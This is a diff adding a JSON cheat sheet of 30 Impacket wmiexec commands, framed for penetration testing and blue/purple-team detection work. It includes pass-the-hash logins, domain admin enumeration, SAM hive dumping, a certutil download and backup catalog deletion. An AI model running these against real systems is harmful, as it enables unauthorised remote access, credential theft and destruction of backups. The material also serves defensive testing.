@@ -1,0 +1,217 @@
+{
+    "tool": "wmiexec",
+    "description": "Complete WMIExec command and workflow reference from basic to advanced remote execution and lateral movement",
+    "total_commands": 30,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Remote Execution",
+            "command": "wmiexec.py administrator@192.168.1.10",
+            "example": "wmiexec.py administrator@192.168.1.10",
+            "explanation": "Initiates a semi-interactive shell on the target using a username and password prompt."
+        },
+        {
+            "id": 2,
+            "category": "Basic Remote Execution",
+            "command": "wmiexec.py administrator:password123@192.168.1.10",
+            "example": "wmiexec.py administrator:password123@192.168.1.10",
+            "explanation": "Connects to the target with the password provided inline in the command string."
+        },
+        {
+            "id": 3,
+            "category": "Target Specification",
+            "command": "wmiexec.py lab_domain/administrator:password123@192.168.1.10",
+            "example": "wmiexec.py lab_domain/administrator:password123@192.168.1.10",
+            "explanation": "Authenticates to a specific domain user on the target IP address."
+        },
+        {
+            "id": 4,
+            "category": "Target Specification",
+            "command": "wmiexec.py administrator:password123@hostname.local",
+            "example": "wmiexec.py administrator:password123@hostname.local",
+            "explanation": "Targets a remote host using its DNS hostname instead of an IP address."
+        },
+        {
+            "id": 5,
+            "category": "Command Execution Workflows",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"hostname\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"hostname\"",
+            "explanation": "Executes a single command non-interactively and retrieves the standard output."
+        },
+        {
+            "id": 6,
+            "category": "Command Execution Workflows",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"ipconfig /all\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"ipconfig /all\"",
+            "explanation": "Runs a detailed network configuration command remotely and exits after output."
+        },
+        {
+            "id": 7,
+            "category": "Command Execution Workflows",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"whoami /priv\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"whoami /priv\"",
+            "explanation": "Checks the privileges of the executing user on the remote system."
+        },
+        {
+            "id": 8,
+            "category": "NTLM Hash Authentication",
+            "command": "wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10",
+            "example": "wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10",
+            "explanation": "Authenticates using the Pass-the-Hash technique with an NT hash only."
+        },
+        {
+            "id": 9,
+            "category": "NTLM Hash Authentication",
+            "command": "wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10",
+            "example": "wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a77c1a1a administrator@192.168.1.10",
+            "explanation": "Authenticates using the Pass-the-Hash technique with both LM and NT hashes."
+        },
+        {
+            "id": 10,
+            "category": "NTLM Hash Authentication",
+            "command": "wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a lab_domain/admin@192.168.1.10",
+            "example": "wmiexec.py -hashes :32693b11e6aa90eb43d32c72a77c1a1a lab_domain/admin@192.168.1.10",
+            "explanation": "Performs Pass-the-Hash authentication for a domain account against a target IP."
+        },
+        {
+            "id": 11,
+            "category": "Kerberos Authentication",
+            "command": "wmiexec.py -k -no-pass hostname.lab_domain.local",
+            "example": "wmiexec.py -k -no-pass hostname.lab_domain.local",
+            "explanation": "Authenticates using a Kerberos ticket from the KRB5CCNAME environment variable."
+        },
+        {
+            "id": 12,
+            "category": "Kerberos Authentication",
+            "command": "wmiexec.py -k -no-pass -dc-ip 192.168.1.5 hostname.lab_domain.local",
+            "example": "wmiexec.py -k -no-pass -dc-ip 192.168.1.5 hostname.lab_domain.local",
+            "explanation": "Uses Kerberos auth while explicitly specifying the Domain Controller IP address."
+        },
+        {
+            "id": 13,
+            "category": "Kerberos Authentication",
+            "command": "wmiexec.py -aesKey 64bit_aes_hex_key_here user@hostname.local",
+            "example": "wmiexec.py -aesKey 64bit_aes_hex_key_here user@hostname.local",
+            "explanation": "Authenticates using an AES256 key for explicit Kerberos key usage."
+        },
+        {
+            "id": 14,
+            "category": "Output and Logging",
+            "command": "wmiexec.py -debug administrator:password123@192.168.1.10",
+            "example": "wmiexec.py -debug administrator:password123@192.168.1.10",
+            "explanation": "Runs the tool in debug mode to display detailed connection and execution logs."
+        },
+        {
+            "id": 15,
+            "category": "Output and Logging",
+            "command": "wmiexec.py -codec utf-8 administrator:password123@192.168.1.10",
+            "example": "wmiexec.py -codec utf-8 administrator:password123@192.168.1.10",
+            "explanation": "Sets the output text encoding codec to handle non-ASCII characters correctly."
+        },
+        {
+            "id": 16,
+            "category": "Lateral Movement Simulation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"net user /domain\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"net user /domain\"",
+            "explanation": "Simulates lateral reconnaissance by querying domain users from a compromised host."
+        },
+        {
+            "id": 17,
+            "category": "Lateral Movement Simulation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"net group 'Domain Admins' /domain\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"net group 'Domain Admins' /domain\"",
+            "explanation": "Simulates privileged group enumeration often performed after initial access."
+        },
+        {
+            "id": 18,
+            "category": "Lateral Movement Simulation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"type C:\\Users\\Administrator\\Desktop\\flag.txt\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"type C:\\Users\\Administrator\\Desktop\\flag.txt\"",
+            "explanation": "Simulates data exfiltration or looting by reading specific files from the target."
+        },
+        {
+            "id": 19,
+            "category": "Blue Team Defensive Validation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"powershell -nop -w hidden -c 'Write-Host Test'\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"powershell -nop -w hidden -c 'Write-Host Test'\"",
+            "explanation": "Executes PowerShell via WMI to test detection of child process creation events."
+        },
+        {
+            "id": 20,
+            "category": "Blue Team Defensive Validation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"certutil -urlcache -split -f http://127.0.0.1/test test.exe\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"certutil -urlcache -split -f http://127.0.0.1/test test.exe\"",
+            "explanation": "Tests detection rules for ingress tool transfer using living-off-the-land binaries."
+        },
+        {
+            "id": 21,
+            "category": "Blue Team Defensive Validation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"reg save HKLM\\SAM sam.save\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"reg save HKLM\\SAM sam.save\"",
+            "explanation": "Simulates credential dumping activity to validate registry access alerting."
+        },
+        {
+            "id": 22,
+            "category": "Advanced and Combined Workflows",
+            "command": "wmiexec.py -shell-type powershell administrator:password123@192.168.1.10",
+            "example": "wmiexec.py -shell-type powershell administrator:password123@192.168.1.10",
+            "explanation": "Instantiates the remote shell using PowerShell instead of the default CMD (if supported)."
+        },
+        {
+            "id": 23,
+            "category": "Advanced and Combined Workflows",
+            "command": "wmiexec.py -ts administrator:password123@192.168.1.10",
+            "example": "wmiexec.py -ts administrator:password123@192.168.1.10",
+            "explanation": "Prepends timestamps to the output logs for better timeline analysis during testing."
+        },
+        {
+            "id": 24,
+            "category": "Incident Response Simulation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"tasklist /v\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"tasklist /v\"",
+            "explanation": " remotely lists running processes to identify suspicious activity or confirm execution."
+        },
+        {
+            "id": 25,
+            "category": "Incident Response Simulation",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"netstat -anob\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"netstat -anob\"",
+            "explanation": "Retrieves active network connections and associated binaries for forensic triage."
+        },
+        {
+            "id": 26,
+            "category": "Automation and Scripting",
+            "command": "wmiexec.py -no-output administrator:password123@192.168.1.10 \"ping -n 1 127.0.0.1\"",
+            "example": "wmiexec.py -no-output administrator:password123@192.168.1.10 \"ping -n 1 127.0.0.1\"",
+            "explanation": "Executes a command blindly without waiting for or retrieving the output file."
+        },
+        {
+            "id": 27,
+            "category": "Automation and Scripting",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"dir C:\\Windows\\System32\\drivers\\etc\\hosts\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"dir C:\\Windows\\System32\\drivers\\etc\\hosts\"",
+            "explanation": "Verifies file existence remotely, often used in automated configuration checks."
+        },
+        {
+            "id": 28,
+            "category": "Purple Team Detection Testing",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"vssadmin list shadows\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"vssadmin list shadows\"",
+            "explanation": "Executes commands often associated with ransomware reconnaissance to test EDR logic."
+        },
+        {
+            "id": 29,
+            "category": "Purple Team Detection Testing",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"wbadmin delete catalog -quiet\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"wbadmin delete catalog -quiet\"",
+            "explanation": "Simulates backup deletion attempts to trigger high-severity backup tampering alerts."
+        },
+        {
+            "id": 30,
+            "category": "Cleanup and Safe Termination",
+            "command": "wmiexec.py administrator:password123@192.168.1.10 \"del C:\\Windows\\Temp\\wmi_output_*.txt\"",
+            "example": "wmiexec.py administrator:password123@192.168.1.10 \"del C:\\Windows\\Temp\\wmi_output_*.txt\"",
+            "explanation": "Manually cleans up any artifact files left if the automatic cleanup mechanism fails."
+        }
+    ]
+}
